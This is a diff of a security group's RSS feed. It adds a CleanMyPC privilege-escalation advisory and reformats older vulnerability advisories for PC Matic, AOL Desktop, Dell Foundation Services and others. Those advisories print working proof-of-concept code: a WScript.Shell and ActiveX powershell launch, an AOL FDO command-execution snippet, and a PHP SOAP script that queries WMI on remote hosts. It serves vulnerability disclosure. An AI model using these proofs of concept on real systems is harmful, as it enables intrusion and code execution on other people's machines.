@@ -5,9 +5,48 @@
     <description></description>
     <link>/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sat, 20 Aug 2016 17:45:56 +0200</pubDate>
-    <lastBuildDate>Sat, 20 Aug 2016 17:45:56 +0200</lastBuildDate>
-    <generator>Jekyll v2.5.3</generator>
+    <pubDate>Tue, 22 Nov 2016 22:33:33 +0000</pubDate>
+    <lastBuildDate>Tue, 22 Nov 2016 22:33:33 +0000</lastBuildDate>
+    <generator>Jekyll v3.1.6</generator>
+    
+      <item>
+        <title>Security Advisory: File Read/Write as SYSTEM Vulnerability in MacPaw CleanMyPC</title>
+        <description>&lt;p&gt;&lt;em&gt;By slipstream/RoL.&lt;/em&gt;&lt;/p&gt;
+
+&lt;h1&gt;Overview&lt;/h1&gt;
+
+&lt;p&gt;CleanMyPC &amp;quot;is more than a PC cleaner — it’s an essential tool that cares for your computer&amp;quot;.&lt;/p&gt;
+
+&lt;p&gt;An issue in CleanMyPC, versions 1.8.1.570 and below, can be exploited by a local attacker to read from and write to any file on the system with SYSTEM privileges. This can lead to local privilege escalation.&lt;/p&gt;
+
+&lt;h1&gt;Issues&lt;/h1&gt;
+
+&lt;p&gt;CleanMyPC bundles a service, named &lt;code&gt;CleanMyPCService&lt;/code&gt; which exposes various WCF services as named pipes.&lt;/p&gt;
+
+&lt;p&gt;One of the services exposed is &lt;code&gt;CmpDataFilesService&lt;/code&gt; which exposes two methods: &lt;code&gt;byte[] GetCleanMyPCDataFileContent(string fileName)&lt;/code&gt; which returns the content of &lt;code&gt;fileName&lt;/code&gt;, read as SYSTEM, and &lt;code&gt;void SaveCleanMyPCDataFileContent(string fileName, byte[] content)&lt;/code&gt; which writes &lt;code&gt;content&lt;/code&gt; to &lt;code&gt;fileName&lt;/code&gt;, again as SYSTEM.&lt;/p&gt;
+
+&lt;p&gt;Both methods try to work with a specific relative path; &lt;code&gt;GetCleanMyPCDataFileContent&lt;/code&gt; if the file exists in that relative path (but this is always false if you pass an absolute path); and &lt;code&gt;SaveCleanMyPCDataFileContent&lt;/code&gt; if the write failed with the path that was passed to it.&lt;/p&gt;
+
+&lt;p&gt;A PoC is &lt;a href=&quot;https://lizardhq.org/files/climbmypc.zip&quot;&gt;available&lt;/a&gt;: &lt;code&gt;climbmypc.cs&lt;/code&gt; attempts to use this issue to copy between two passed file locations as SYSTEM.&lt;/p&gt;
+
+&lt;h1&gt;Affected Versions&lt;/h1&gt;
+
+&lt;p&gt;Version 1.8.1.570 and below.&lt;/p&gt;
+
+&lt;h1&gt;Solution&lt;/h1&gt;
+
+&lt;p&gt;Uninstallation of this software will prevent exploitation of the issue. The researchers cannot sanction any mitigations except to remove this software definitively from any affected devices.&lt;/p&gt;
+
+&lt;h1&gt;Greetings&lt;/h1&gt;
+
+&lt;p&gt;Thanks to Techdirt for &lt;a href=&quot;https://www.techdirt.com/articles/20161118/09225436083/daily-deal-cleanmypc-single-license-sorry-about-that.shtml&quot;&gt;their accidental promotion of CleanMyPC&lt;/a&gt;. Without it, I probably wouldn&amp;#39;t have found the software to audit it.&lt;/p&gt;
+</description>
+        <pubDate>Mon, 21 Nov 2016 00:00:00 +0000</pubDate>
+        <link>/2016/11/21/cleanmypc.html</link>
+        <guid isPermaLink="true">/2016/11/21/cleanmypc.html</guid>
+        
+        
+      </item>
     
       <item>
         <title>Security Advisory: Multiple Critical Vulnerabilities in PCPitstop PC Matic</title>
@@ -24,17 +63,17 @@
 &lt;h1&gt;Issues&lt;/h1&gt;
 
 &lt;p&gt;The PC Matic application is basically Internet Explorer. A version of IE that allows for certain objects like &lt;code&gt;WScript.Shell&lt;/code&gt; to be instantiated. The application loads a home page via HTTP, which then loads some javascript files, which among other things do call out to &lt;code&gt;WScript.Shell&lt;/code&gt;. An entity in a MITM position can easily intercept requests to &lt;code&gt;http://*.pcpitstop.com/Nirvana/*.js&lt;/code&gt; and respond with JavaScript of their choice, the traditional &lt;code&gt;calc.exe&lt;/code&gt; payload here being:&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ActiveXObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;WScript.Shell&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;calc.exe&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ActiveXObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;WScript.Shell&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;calc.exe&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;Additionally, the PC Matic installer installs a service that runs as SYSTEM, which essentially runs &lt;code&gt;wscript scan.wsf&lt;/code&gt; every hour, as SYSTEM. &lt;code&gt;scan.wsf&lt;/code&gt; basically GETS the contents of &lt;code&gt;http://www.pcpitstop.com/Nirvana/scheduledscanpack.js&lt;/code&gt; and then &lt;code&gt;eval()&lt;/code&gt;s it. So an entity in a MITM position can just wait up to an hour for the service to run their own JavaScript, as SYSTEM.&lt;/p&gt;
 
 &lt;p&gt;PC Matic also installs and uses several ActiveX controls, that are signed by a code signing certificate issued by Thawte. One of these ActiveX controls, &lt;code&gt;PCPitstop2.dll&lt;/code&gt;, exposes some interesting methods to IE. Some are limited to specific domains (however, any cross-site-scripting issue in the allowed domains would bypass this limitation). Some, however, are not; and so...&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;object&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Exam&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Exam&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;classid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;CLSID:FFB3A759-98B1-446F-BDA9-909C6EB18CC7&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/object&amp;gt;&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;object&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Exam&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Exam&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;classid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CLSID:FFB3A759-98B1-446F-BDA9-909C6EB18CC7&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/object&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
-        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;Exam&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DeviceDriverInstallArguments&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;-EncodedCommand ...&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;InstallDriver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;powershell.exe&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;Exam&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DeviceDriverInstallArguments&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;-EncodedCommand ...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;InstallDriver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;powershell.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;})();&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
@@ -48,7 +87,7 @@
 
 &lt;p&gt;Uninstallation of this software will prevent exploitation of these issues. The researchers cannot sanction any mitigations except to remove this software definitively from any affected devices.&lt;/p&gt;
 </description>
-        <pubDate>Fri, 19 Feb 2016 00:00:00 +0100</pubDate>
+        <pubDate>Fri, 19 Feb 2016 00:00:00 +0000</pubDate>
         <link>/2016/02/19/pcmatic.html</link>
         <guid isPermaLink="true">/2016/02/19/pcmatic.html</guid>
         
@@ -85,7 +124,7 @@
 
 &lt;p&gt;Uninstallation of this software will prevent exploitation of the issue. The researchers cannot sanction any mitigations except to remove this software definitively from any affected devices.&lt;/p&gt;
 </description>
-        <pubDate>Sat, 05 Dec 2015 00:00:00 +0100</pubDate>
+        <pubDate>Sat, 05 Dec 2015 00:00:00 +0000</pubDate>
         <link>/2015/12/05/toshiba-service-station.html</link>
         <guid isPermaLink="true">/2015/12/05/toshiba-service-station.html</guid>
         
@@ -128,7 +167,7 @@
 
 &lt;p&gt;Uninstallation of this software will prevent exploitation of the issue. The researchers cannot sanction any mitigations except to remove this software definitively from any affected devices.&lt;/p&gt;
 </description>
-        <pubDate>Sat, 05 Dec 2015 00:00:00 +0100</pubDate>
+        <pubDate>Sat, 05 Dec 2015 00:00:00 +0000</pubDate>
         <link>/2015/12/05/lenovo.html</link>
         <guid isPermaLink="true">/2015/12/05/lenovo.html</guid>
         
@@ -184,7 +223,7 @@
 
 &lt;p&gt;The researchers cannot sanction any mitigations except to perform these actions.&lt;/p&gt;
 </description>
-        <pubDate>Sat, 05 Dec 2015 00:00:00 +0100</pubDate>
+        <pubDate>Sat, 05 Dec 2015 00:00:00 +0000</pubDate>
         <link>/2015/12/05/dell-system-detect.html</link>
         <guid isPermaLink="true">/2015/12/05/dell-system-detect.html</guid>
         
@@ -212,9 +251,9 @@
 &lt;p&gt;The &lt;code&gt;async_exec_app&lt;/code&gt; opcode (&lt;code&gt;0x0d19&lt;/code&gt;) takes a string operand, and executes the command in that string. This opcode has existed since version 2.0 of AOL for Windows, from 1994.&lt;/p&gt;
 
 &lt;p&gt;The snippet of FDO that follows attempts to write &lt;code&gt;pwned.txt&lt;/code&gt; to disk and execute &lt;code&gt;notepad.exe&lt;/code&gt; with the path to &lt;code&gt;pwned.txt&lt;/code&gt; as an argument:&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;fm_start
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;fm_start
 fm_item_type &amp;lt;filename&amp;gt;
-fm_item_set &amp;lt;&amp;quot;pwned.txt&amp;quot;&amp;gt;
+fm_item_set &amp;lt;&quot;pwned.txt&quot;&amp;gt;
 fm_item_type &amp;lt;path&amp;gt;
 cm_tb_get_path
 uni_use_last_atom_string &amp;lt;fm_item_set&amp;gt;
@@ -222,13 +261,13 @@ fm_item_get &amp;lt;filespec&amp;gt;
 uni_use_last_atom_string &amp;lt;var_string_set, 01x&amp;gt;
 fm_create_file
 fm_open_file &amp;lt;01x&amp;gt;
-fm_append_data &amp;lt;&amp;quot;AOL pwned clientside through MITM...\r\nReading/writing to FS and arbitrary command execution 1993-2015 :)&amp;quot;&amp;gt;
+fm_append_data &amp;lt;&quot;AOL pwned clientside through MITM...\r\nReading/writing to FS and arbitrary command execution 1993-2015 :)&quot;&amp;gt;
 fm_flush_file
 fm_close_file
 fm_end
-var_string_set &amp;lt;A,&amp;quot;notepad.exe \&amp;quot;&amp;quot;&amp;gt;
+var_string_set &amp;lt;A,&quot;notepad.exe \&quot;&quot;&amp;gt;
 var_string_concatenate_regs &amp;lt;A,B&amp;gt;
-var_string_set &amp;lt;B,&amp;quot;\&amp;quot;&amp;quot;&amp;gt;
+var_string_set &amp;lt;B,&quot;\&quot;&quot;&amp;gt;
 var_string_concatenate_regs &amp;lt;A,B&amp;gt;
 var_string_get &amp;lt;A&amp;gt;
 uni_use_last_atom_string &amp;lt;async_exec_app&amp;gt;
@@ -243,7 +282,7 @@ uni_use_last_atom_string &amp;lt;async_exec_app&amp;gt;
 
 &lt;p&gt;Uninstallation of this software will prevent exploitation of these issues. The researchers cannot sanction any mitigations except to remove this software definitively from any affected devices.&lt;/p&gt;
 </description>
-        <pubDate>Sat, 05 Dec 2015 00:00:00 +0100</pubDate>
+        <pubDate>Sat, 05 Dec 2015 00:00:00 +0000</pubDate>
         <link>/2015/12/05/aol-desktop.html</link>
         <guid isPermaLink="true">/2015/12/05/aol-desktop.html</guid>
         
@@ -271,25 +310,25 @@ uni_use_last_atom_string &amp;lt;async_exec_app&amp;gt;
 &lt;p&gt;&lt;a href=&quot;https://www.shodan.io/search?query=port%3A7779+httpapi+404&amp;amp;language=None&quot;&gt;Many potentially vulnerable hosts can be found via Shodan&lt;/a&gt; and the issue can also be exploited over a LAN.&lt;/p&gt;
 
 &lt;p&gt;Quick PHP one-liner proof-of-concept:&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;php -r &amp;quot;function wmic($ip,$query) { var_dump(dowmic($ip,$query)); } function dowmic($ip,$query) { return callApi($ip,&amp;#39;GetWmiCollection&amp;#39;,array(new SoapVar($query,XSD_STRING,null,null,&amp;#39;wmiQuery&amp;#39;,&amp;#39;http://tempuri.org/&amp;#39;))); } function callApi($ip,$method,$params = array()) { return (new SoapClient(null,array(&amp;#39;location&amp;#39;=&amp;gt;&amp;#39;http://&amp;#39;.$ip.&amp;#39;:7779/Dell%20Foundation%20Services/ISystemInfoCapabilitiesApi&amp;#39;,&amp;#39;uri&amp;#39;=&amp;gt;&amp;#39;http://tempuri.org/&amp;#39;)))-&amp;gt;__soapCall($method,$params,array(&amp;#39;soapaction&amp;#39;=&amp;gt;&amp;#39;http://tempuri.org/ISystemInfoCapabilitiesApi/&amp;#39;.$method)); } wmic(&amp;#39;&amp;#39;,&amp;#39;&amp;#39;);&amp;quot;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;php -r &quot;function wmic($ip,$query) { var_dump(dowmic($ip,$query)); } function dowmic($ip,$query) { return callApi($ip,&#39;GetWmiCollection&#39;,array(new SoapVar($query,XSD_STRING,null,null,&#39;wmiQuery&#39;,&#39;http://tempuri.org/&#39;))); } function callApi($ip,$method,$params = array()) { return (new SoapClient(null,array(&#39;location&#39;=&amp;gt;&#39;http://&#39;.$ip.&#39;:7779/Dell%20Foundation%20Services/ISystemInfoCapabilitiesApi&#39;,&#39;uri&#39;=&amp;gt;&#39;http://tempuri.org/&#39;)))-&amp;gt;__soapCall($method,$params,array(&#39;soapaction&#39;=&amp;gt;&#39;http://tempuri.org/ISystemInfoCapabilitiesApi/&#39;.$method)); } wmic(&#39;&#39;,&#39;&#39;);&quot;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;This can be expanded to:&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;lt;?php
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;&amp;lt;?php
 function wmic($ip,$query) {
     var_dump(dowmic($ip,$query));
 }
 
 function dowmic($ip,$query) {
-    return callApi($ip,&amp;#39;GetWmiCollection&amp;#39;,array(new SoapVar($query,XSD_STRING,null,null,&amp;#39;wmiQuery&amp;#39;,&amp;#39;http://tempuri.org/&amp;#39;)));
+    return callApi($ip,&#39;GetWmiCollection&#39;,array(new SoapVar($query,XSD_STRING,null,null,&#39;wmiQuery&#39;,&#39;http://tempuri.org/&#39;)));
 }
 
 function callApi($ip,$method,$params = array()) {
     return (
-        new SoapClient(null,array(&amp;#39;location&amp;#39;=&amp;gt;&amp;#39;http://&amp;#39;.$ip.&amp;#39;:7779/Dell%20Foundation%20Services/ISystemInfoCapabilitiesApi&amp;#39;,&amp;#39;uri&amp;#39;=&amp;gt;&amp;#39;http://tempuri.org/&amp;#39;))
-    )-&amp;gt;__soapCall($method,$params,array(&amp;#39;soapaction&amp;#39;=&amp;gt;&amp;#39;http://tempuri.org/ISystemInfoCapabilitiesApi/&amp;#39;.$method));
+        new SoapClient(null,array(&#39;location&#39;=&amp;gt;&#39;http://&#39;.$ip.&#39;:7779/Dell%20Foundation%20Services/ISystemInfoCapabilitiesApi&#39;,&#39;uri&#39;=&amp;gt;&#39;http://tempuri.org/&#39;))
+    )-&amp;gt;__soapCall($method,$params,array(&#39;soapaction&#39;=&amp;gt;&#39;http://tempuri.org/ISystemInfoCapabilitiesApi/&#39;.$method));
 }
 
-wmic(&amp;#39;&amp;#39;,&amp;#39;&amp;#39;);
+wmic(&#39;&#39;,&#39;&#39;);
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;h1&gt;Affected Versions&lt;/h1&gt;
 
@@ -299,7 +338,7 @@ wmic(&amp;#39;&amp;#39;,&amp;#39;&amp;#39;);
 
 &lt;p&gt;Uninstallation of Dell Foundation Services will prevent exploitation of the issue. The researchers cannot sanction any mitigations except to remove this software definitively from any affected devices.&lt;/p&gt;
 </description>
-        <pubDate>Tue, 01 Dec 2015 00:00:00 +0100</pubDate>
+        <pubDate>Tue, 01 Dec 2015 00:00:00 +0000</pubDate>
         <link>/2015/12/01/dell-foundation-services.2.html</link>
         <guid isPermaLink="true">/2015/12/01/dell-foundation-services.2.html</guid>
         
@@ -329,20 +368,20 @@ wmic(&amp;#39;&amp;#39;,&amp;#39;&amp;#39;);
 &lt;p&gt;A proof-of-concept to exploit these issues is available at &lt;a href=&quot;http://rol.im/dell/&quot;&gt;here&lt;/a&gt; and you can view the source of that page to obtain almost all of the required technical information needed to exploit.&lt;/p&gt;
 
 &lt;p&gt;The missing piece is getrequest.php, which scrapes Dell&amp;#39;s site to obtain the needed information to call the second JSONP API endpoint:&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;lt;?php
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;&amp;lt;?php
 
-$f = file_get_contents(&amp;quot;http://www.dell.com/support/home/us/en/04&amp;quot;);
+$f = file_get_contents(&quot;http://www.dell.com/support/home/us/en/04&quot;);
 
-$signature = array_shift(explode(&amp;quot;&amp;#39;;&amp;quot;,array_pop(explode(&amp;quot;var dfsSignatureToken = &amp;#39;&amp;quot;,$f))));
-$expires = array_shift(explode(&amp;quot;&amp;#39;;&amp;quot;,array_pop(explode(&amp;quot;var tokenExpires = &amp;#39;&amp;quot;,$f))));
-$interface = array_shift(explode(&amp;quot;&amp;#39;;&amp;quot;,array_pop(explode(&amp;quot;var dfsInterfaceApi = &amp;#39;&amp;quot;,$f))));
-$url = array_shift(explode(&amp;quot;&amp;#39;;&amp;quot;,array_pop(explode(&amp;quot;var DFSUrl = &amp;#39;&amp;quot;,$f))));
+$signature = array_shift(explode(&quot;&#39;;&quot;,array_pop(explode(&quot;var dfsSignatureToken = &#39;&quot;,$f))));
+$expires = array_shift(explode(&quot;&#39;;&quot;,array_pop(explode(&quot;var tokenExpires = &#39;&quot;,$f))));
+$interface = array_shift(explode(&quot;&#39;;&quot;,array_pop(explode(&quot;var dfsInterfaceApi = &#39;&quot;,$f))));
+$url = array_shift(explode(&quot;&#39;;&quot;,array_pop(explode(&quot;var DFSUrl = &#39;&quot;,$f))));
 
 echo json_encode( (object) array(
-    &amp;quot;signature&amp;quot;=&amp;gt;$signature,
-    &amp;quot;expires&amp;quot;=&amp;gt;$expires,
-    &amp;quot;interface&amp;quot;=&amp;gt;$interface,
-    &amp;quot;url&amp;quot;=&amp;gt;$url
+    &quot;signature&quot;=&amp;gt;$signature,
+    &quot;expires&quot;=&amp;gt;$expires,
+    &quot;interface&quot;=&amp;gt;$interface,
+    &quot;url&quot;=&amp;gt;$url
 ));
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;h1&gt;Affected Versions&lt;/h1&gt;
@@ -353,7 +392,7 @@ echo json_encode( (object) array(
 
 &lt;p&gt;Uninstallation of Dell Foundation Services will prevent exploitation of these issues. The researchers cannot sanction any mitigations except to remove this software definitively from any affected devices.&lt;/p&gt;
 </description>
-        <pubDate>Wed, 25 Nov 2015 00:00:00 +0100</pubDate>
+        <pubDate>Wed, 25 Nov 2015 00:00:00 +0000</pubDate>
         <link>/2015/11/25/dell-foundation-services.html</link>
         <guid isPermaLink="true">/2015/11/25/dell-foundation-services.html</guid>
         
@@ -419,7 +458,7 @@ The server does not respond to this command; after the command is sent, the clie
 
 &lt;p&gt;Uninstallation of Impero Education Pro will prevent exploitation of these issues. The researchers cannot sanction any mitigations except to remove this software definitively from any affected devices.&lt;/p&gt;
 </description>
-        <pubDate>Tue, 04 Aug 2015 00:00:00 +0200</pubDate>
+        <pubDate>Tue, 04 Aug 2015 00:00:00 +0100</pubDate>
         <link>/2015/08/04/impero-2.html</link>
         <guid isPermaLink="true">/2015/08/04/impero-2.html</guid>
         
@@ -478,74 +517,9 @@ The server does not respond to this command; after the command is sent, the clie
 
 &lt;p&gt;Uninstallation of Impero Education Pro will prevent exploitation of these issues. The researchers cannot sanction any mitigations except to remove this software definitively from any affected devices.&lt;/p&gt;
 </description>
-        <pubDate>Tue, 14 Jul 2015 00:00:00 +0200</pubDate>
+        <pubDate>Tue, 14 Jul 2015 00:00:00 +0100</pubDate>
         <link>/2015/07/14/impero.html</link>
         <guid isPermaLink="true">/2015/07/14/impero.html</guid>
-        
-        
-      </item>
-    
-      <item>
-        <title>Response to Decision Group press release about security vulnerabilities in E-Detective Lawful Interception System</title>
-        <description>&lt;p&gt;&lt;em&gt;By Mustafa Al-Bassam.&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;Two weeks ago we posted a &lt;a href=&quot;../../../2015/06/14/e-detective.html&quot;&gt;security advisory&lt;/a&gt; detailing severe security flaws in E-Detective, a &amp;quot;lawful&amp;quot; communications interception system. The vendor is a company called Decision Group and they &lt;a href=&quot;http://www.edecision4u.com/HTTPS-SSL.html&quot;&gt;claim on their website&lt;/a&gt; that their software is used by over 100 law enforcement agencies.&lt;/p&gt;
-
-&lt;p&gt;A few days ago they posted a &lt;a href=&quot;http://www.edecision4u.com/2015news/20150618_New%20Release.html&quot;&gt;press release&lt;/a&gt; to respond to an &lt;a href=&quot;http://www.ibtimes.co.uk/e-detective-spying-tool-used-by-over-100-law-enforcement-agencies-has-major-security-holes-1506447&quot;&gt;IBTimes article&lt;/a&gt; that covered the security flaws.&lt;/p&gt;
-
-&lt;p&gt;The mere fact that they responded to a news article about the security flaws instead of the original security advisory is telling of their attitude to security. An attitude that is unfortunately too common: that security is seen as an externality that affects its customers more than the company itself, so resources should only be devoted to it if it&amp;#39;s a public relations issue.&lt;/p&gt;
-
-&lt;p&gt;Nevertheless, their response is very much a non-response. It fails to express responsibility for the security holes, and instead deflects the responsibility on their customers.&lt;/p&gt;
-
-&lt;p&gt;Excusing their broken English, here&amp;#39;s a point-by-point response to their press release.&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Actually we are fully aware of such security concern since 4 years ago when our client asked to enhance the security level of E-Detective system.&amp;quot;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;The fact that they&amp;#39;ve been fully aware of these security flaws for 4 years and failed to do something about them until recently is not exactly redeeming. That only makes it much, much worse.&lt;/p&gt;
-
-&lt;p&gt;By their own admission they admit that third parties (their clients) have known about these vulnerabilities. Their clients (one of whom they claim to be the National Security Bureau of the Republic of China, which is effectively the Taiwanese NSA) buy their software for the purpose of degrading security. One can only shudder to imagine how many times these flaws have been attempted to be exploited for the purpose of collecting intercepts from other customers.&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;The most important guideline of E-Detective deployment is that E-Detective should be deployed in the closed network domain without Internet access to outside world. This network domain should be also isolated from other corporate or government service network segment. By this way, only few authentic staff can access the internal system.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;A great example of how a false sense of security can be dangerous. Isolating services in their own network doesn&amp;#39;t fix the security flaws nor make them impossible to exploit - it just makes it harder.&lt;/p&gt;
-
-&lt;p&gt;There are countless ways that a private network can be compromised. No matter how tight your network is. To get any reasonable work done staff members will move data in and out of the network, even if your network is disconnected from the Internet. There are many entry points into a network, something which shouldn&amp;#39;t really need to be explained to a company that sells surveillance software for a living if they are competent.&lt;/p&gt;
-
-&lt;p&gt;Software compartmentalisation and network isolation is a good security practice, but it&amp;#39;s not a substitute for fixing vulnerabilities or an excuse to run dangerously insecure software.&lt;/p&gt;
-
-&lt;p&gt;Even if one was to make the (false) assumption that running E-Detective on an isolated network prevents vulnerabilities affected by it from being exploited: how many of those &amp;quot;100+&amp;quot; customers actually follow these guidelines or have a sane network setup that allows them to do this kind of isolation?&lt;/p&gt;
-
